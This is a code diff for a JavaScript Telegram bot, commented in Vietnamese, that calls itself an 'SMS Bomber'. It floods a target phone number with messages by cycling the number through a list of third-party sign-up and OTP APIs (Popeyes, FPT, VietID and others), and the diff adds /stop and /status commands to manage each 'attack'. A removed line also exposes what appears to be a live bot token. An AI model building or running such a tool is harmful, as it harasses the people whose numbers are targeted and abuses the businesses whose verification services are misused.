@@ -1,16 +1,22 @@
 // api/sms.js
-// Bot Telegram SMS Bomber - Đã chuyển đổi TOÀN BỘ từ Python sang JavaScript
+// Bot Telegram SMS Bomber - Có lệnh /stop để dừng cuộc tấn công
 
 import { Telegraf } from 'telegraf';
 
 // ============================================
 // 1. CẤU HÌNH BOT
 // ============================================
-const BOT_TOKEN = '8624782345:AAHjhUAwov-IDPsIXkiX2V10U8GcFqE0C-E'; // <<<< THAY BẰNG TOKEN THẬT
+const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'; // <<<< THAY BẰNG TOKEN THẬT
 const bot = new Telegraf(BOT_TOKEN);
 
 // ============================================
-// 2. HÀM GỌI API CHUNG (có timeout, bắt lỗi)
+// 2. BIẾN TOÀN CỤC ĐỂ QUẢN LÝ TRẠNG THÁI
+// ============================================
+// Lưu trạng thái "có đang chạy hay không" cho từng chat
+const activeAttacks = new Map(); // key: chatId, value: { stopRequested: true/false }
+
+// ============================================
+// 3. HÀM GỌI API CHUNG (có timeout, bắt lỗi)
 // ============================================
 async function callApi(url, options = {}) {
     const controller = new AbortController();
@@ -26,7 +32,7 @@ async function callApi(url, options = {}) {
 }
 
 // ============================================
-// 3. TOÀN BỘ CÁC HÀM SPAM (ĐÃ CHUYỂN TỪ PYTHON)
+// 4. TOÀN BỘ CÁC HÀM SPAM (ĐÃ CHUYỂN TỪ PYTHON)
 // ============================================
 
 // 1. popeyes
@@ -249,7 +255,6 @@ async function fptplay(sdt) {
 
 // 19. vietid
 async function vietid(phone) {
-    // Cần lấy csrf token trước
     const csrfRes = await callApi("https://oauth.vietid.net/rb/login?next=https://oauth.vietid.net/rb/authorize?client_id=83958575a2421647&response_type=code&redirect_uri=https://enbac.com/member_login.php");
     let csrf = "";
     if (csrfRes) {
@@ -505,7 +510,7 @@ async function thepizzacompany(sdt) {
 }
 
 // ============================================
-// 4. DANH SÁCH TẤT CẢ HÀM SPAM
+// 5. DANH SÁCH TẤT CẢ HÀM SPAM
 // ============================================
 const spamFunctions = [
     popeyes, alfrescos, bibabo, thantaioilo, tv360, fpt, oldloship, vayvnd, tamo, meta,
@@ -515,21 +520,63 @@ const spamFunctions = [
 ];
 
 // ============================================
-// 5. LOGIC BOT TELEGRAM
+// 6. LOGIC BOT TELEGRAM
 // ============================================
+
+// Lệnh /start
 bot.start((ctx) => {
-    ctx.reply('🔥 Chào bạn! Bot SMS Bomber đây.\n\n' +
-               '📋 Lệnh: /sms [số điện thoại] [số lần]\n' +
-               '📱 Ví dụ: /sms 0912345678 3\n\n' +
-               '⚠️ Số lần tối đa: 10 (giới hạn Vercel)\n' +
-               '⏱️ Bot sẽ chạy khoảng 10 giây rồi tự dừng.');
+    ctx.reply(
+        '🔥 *SMS BOMBER BOT* 🔥\n\n' +
+        '📋 *Các lệnh:*\n' +
+        '  • /sms \\[số điện thoại\\] \\[số lần\\] - Bắt đầu tấn công\n' +
+        '  • /stop - Dừng tấn công ngay lập tức\n' +
+        '  • /status - Kiểm tra trạng thái bot\n\n' +
+        '📱 *Ví dụ:* /sms 0912345678 5\n\n' +
+        '⚠️ Số lần tối đa: 10 (giới hạn Vercel 10s)\n' +
+        '🛑 Dùng /stop để dừng giữa chừng',
+        { parse_mode: 'Markdown' }
+    );
 });
 
+// Lệnh /status - Kiểm tra trạng thái
+bot.command('status', (ctx) => {
+    const chatId = ctx.chat.id;
+    const attack = activeAttacks.get(chatId);
+    if (attack && attack.isRunning) {
+        ctx.reply(`🟢 *Đang chạy!*\n📱 SĐT: ${attack.phone}\n🔄 Đã gửi: ${attack.sent}/${attack.total}\n✅ OK: ${attack.ok}\n❌ Fail: ${attack.fail}\n\n🛑 Gửi /stop để dừng`, { parse_mode: 'Markdown' });
+    } else {
+        ctx.reply('⚪ *Không có cuộc tấn công nào đang chạy.*', { parse_mode: 'Markdown' });
+    }
+});
+
+// Lệnh /stop - DỪNG TẤN CÔNG
+bot.command('stop', (ctx) => {
+    const chatId = ctx.chat.id;
+    const attack = activeAttacks.get(chatId);
+    
+    if (attack && attack.isRunning) {
+        attack.stopRequested = true;
+        attack.stopTime = Date.now();
+        ctx.reply('⏹️ *ĐANG DỪNG...*\n\nBot sẽ dừng sau khi hoàn thành request hiện tại.\nVui lòng đợi vài giây...', { parse_mode: 'Markdown' });
+    } else {
+        ctx.reply('⚠️ *Không có cuộc tấn công nào đang chạy để dừng!*', { parse_mode: 'Markdown' });
+    }
+});
+
+// Lệnh /sms - BẮT ĐẦU TẤN CÔNG
 bot.command('sms', async (ctx) => {
+    const chatId = ctx.chat.id;
+    
+    // Kiểm tra có đang chạy không
+    const existingAttack = activeAttacks.get(chatId);
+    if (existingAttack && existingAttack.isRunning) {
+        return ctx.reply('⚠️ *Đang có cuộc tấn công khác đang chạy!*\nGửi /stop để dừng trước.', { parse_mode: 'Markdown' });
+    }
+    
     const args = ctx.message.text.split(' ');
     
     if (args.length < 3) {
-        return ctx.reply('❌ Thiếu tham số. Ví dụ: /sms 0912345678 5');
+        return ctx.reply('❌ *Thiếu tham số!*\nVí dụ: /sms 0912345678 5', { parse_mode: 'Markdown' });
     }
 
     const phone = args[1];
@@ -537,43 +584,101 @@ bot.command('sms', async (ctx) => {
 
     // Kiểm tra số điện thoại hợp lệ
     if (!/^0\d{9,10}$/.test(phone)) {
-        return ctx.reply('❌ Số điện thoại không hợp lệ. Ví dụ: 0912345678');
+        return ctx.reply('❌ *Số điện thoại không hợp lệ!*\nVí dụ: 0912345678', { parse_mode: 'Markdown' });
     }
 
     if (isNaN(amount) || amount < 1 || amount > 10) {
-        return ctx.reply('⚠️ Số lần phải từ 1 đến 10 (giới hạn Vercel 10s).');
+        return ctx.reply('⚠️ *Số lần phải từ 1 đến 10!* (Giới hạn Vercel 10s)', { parse_mode: 'Markdown' });
     }
 
+    // Tạo trạng thái tấn công mới
+    const attackState = {
+        isRunning: true,
+        stopRequested: false,
+        phone: phone,
+        total: amount * 2, // Mỗi lần gọi 2 API
+        sent: 0,
+        ok: 0,
+        fail: 0,
+        startTime: Date.now(),
+    };
+    activeAttacks.set(chatId, attackState);
+
     // Báo bắt đầu
-    const startMsg = await ctx.reply(`🚀 BẮT ĐẦU!\n📱 SĐT: ${phone}\n🔄 Số lần: ${amount}\n⏳ Đợi ~${amount * 2}s...`);
+    const startMsg = await ctx.reply(
+        `🚀 *BẮT ĐẦU TẤN CÔNG!*\n\n` +
+        `📱 *SĐT:* \`${phone}\`\n` +
+        `🔄 *Số lần:* ${amount}\n` +
+        `📡 *Số API:* ${spamFunctions.length}\n` +
+        `⏳ *Dự kiến:* ~${amount * 2}s\n\n` +
+        `🛑 Gửi /stop để dừng bất cứ lúc nào!`,
+        { parse_mode: 'Markdown' }
+    );
 
     // Chạy ngầm
-    let successCount = 0;
-    let failCount = 0;
-
     for (let i = 0; i < amount; i++) {
+        // KIỂM TRA DỪNG
+        if (attackState.stopRequested) {
+            break;
+        }
+        
         const func1 = spamFunctions[i % spamFunctions.length];
         const func2 = spamFunctions[(i + 1) % spamFunctions.length];
         
         // Gọi 2 API cùng lúc
         const [res1, res2] = await Promise.allSettled([func1(phone), func2(phone)]);
         
-        if (res1.value) successCount++; else failCount++;
-        if (res2.value) successCount++; else failCount++;
+        attackState.sent += 2;
+        if (res1.value) attackState.ok++;
+        else attackState.fail++;
+        if (res2.value) attackState.ok++;
+        else attackState.fail++;
         
-        // Nghỉ 1-2 giây
-        await new Promise(resolve => setTimeout(resolve, 1500));
+        // Cập nhật trạng thái
+        activeAttacks.set(chatId, attackState);
+        
+        // Nghỉ 1.5 giây
+        if (i < amount - 1 && !attackState.stopRequested) {
+            await new Promise(resolve => setTimeout(resolve, 1500));
+        }
     }
 
-    // Báo kết quả
-    ctx.telegram.editMessageText(
-        startMsg.chat.id, startMsg.message_id, undefined,
-        `✅ HOÀN THÀNH!\n📱 SĐT: ${phone}\n✅ Gửi OK: ${successCount}\n❌ Lỗi: ${failCount}\n\n💡 Lưu ý: Đây là bot dùng API miễn phí, tỉ lệ thành công không cao!`
-    );
+    // Kết thúc
+    attackState.isRunning = false;
+    
+    if (attackState.stopRequested) {
+        ctx.telegram.editMessageText(
+            startMsg.chat.id, startMsg.message_id, undefined,
+            `⏹️ *ĐÃ DỪNG!*\n\n` +
+            `📱 *SĐT:* \`${phone}\`\n` +
+            `📤 *Đã gửi:* ${attackState.sent}/${attackState.total} requests\n` +
+            `✅ *OK:* ${attackState.ok}\n` +
+            `❌ *Fail:* ${attackState.fail}\n` +
+            `⚡ *Thời gian:* ${Math.round((Date.now() - attackState.startTime) / 1000)}s`,
+            { parse_mode: 'Markdown' }
+        );
+    } else {
+        ctx.telegram.editMessageText(
+            startMsg.chat.id, startMsg.message_id, undefined,
+            `✅ *HOÀN THÀNH!*\n\n` +
+            `📱 *SĐT:* \`${phone}\`\n` +
+            `📤 *Tổng requests:* ${attackState.sent}\n` +
+            `✅ *OK:* ${attackState.ok}\n` +
+            `❌ *Fail:* ${attackState.fail}\n` +
+            `⚡ *Thời gian:* ${Math.round((Date.now() - attackState.startTime) / 1000)}s\n\n` +
+            `💡 *Lưu ý:* API miễn phí, tỉ lệ thành công không cao!`,
+            { parse_mode: 'Markdown' }
+        );
+    }
+    
+    // Xóa trạng thái sau 1 phút
+    setTimeout(() => {
+        activeAttacks.delete(chatId);
+    }, 60000);
 });
 
 // ============================================
-// 6. WEBHOOK HANDLER CHO VERCEL
+// 7. WEBHOOK HANDLER CHO VERCEL
 // ============================================
 export default async function handler(req, res) {
     if (req.method === 'POST') {
@@ -585,6 +690,10 @@ export default async function handler(req, res) {
             res.status(200).json({ status: 'error' });
         }
     } else {
-        res.status(200).json({ status: 'Bot is running!', message: 'Gửi POST request để dùng webhook.' });
+        res.status(200).json({ 
+            status: 'Bot is running!',
+            commands: ['/start', '/sms [phone] [amount]', '/stop', '/status'],
+            note: 'Gửi POST request để dùng webhook Telegram.'
+        });
     }
 }
